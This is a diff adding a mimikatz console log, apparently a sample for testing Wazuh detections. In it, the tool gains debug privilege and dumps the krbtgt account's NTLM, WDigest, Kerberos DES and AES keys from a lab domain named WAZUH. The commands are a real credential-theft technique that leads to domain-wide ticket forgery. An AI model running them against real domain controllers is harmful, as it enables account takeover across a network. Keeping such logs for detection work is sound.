@@ -1,0 +1,46 @@
+  .#####.   mimikatz 2.1.1 (x64) built on Sep 25 2018 15:08:14
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # lsadump::lsa /inject /name:krbtgt
+Domain : WAZUH / S-1-5-21-3307301586-4221688441-1196996515
+
+RID  : 000001f6 (502)
+User : krbtgt
+
+ * Primary
+    NTLM : ec9183c701e861eda574d85939d635cd
+    LM   :~
+  Hash NTLM: ec9183c701e861eda574d85939d635cd
+    ntlm- 0: ec9183c701e861eda574d85939d635cd
+    lm  - 0: e3fdacbcf66ca710dd67d4adaf560a14
+
+ * WDigest
+    01  aaf3934513bd56bdf87488e6b5fe3a91
+[... 27 hashes go here ...]
+    29  39dcc556a07bd3f75676e85a8c2cda89
+
+ * Kerberos
+    Default Salt : WAZUH.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 54e9bf86381c91f2
+
+ * Kerberos-Newer-Keys
+    Default Salt : WAZUH.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 8e3a85194965b2d7eaf10a92f46cf39f942b9c81ed3b5762e8dbb25d9b67b740
+      aes128_hmac       (4096) : 6b4634f9504406a36e5cde7a2dc4c492
+      des_cbc_md5       (4096) : 54e9bf86381c91f2
+
+ * NTLM-Strong-NTOWF
+    Random Value : 695441dc49e4a555d68265deb0e13f4f
+
+mimikatz(commandline) # exit
+Bye!
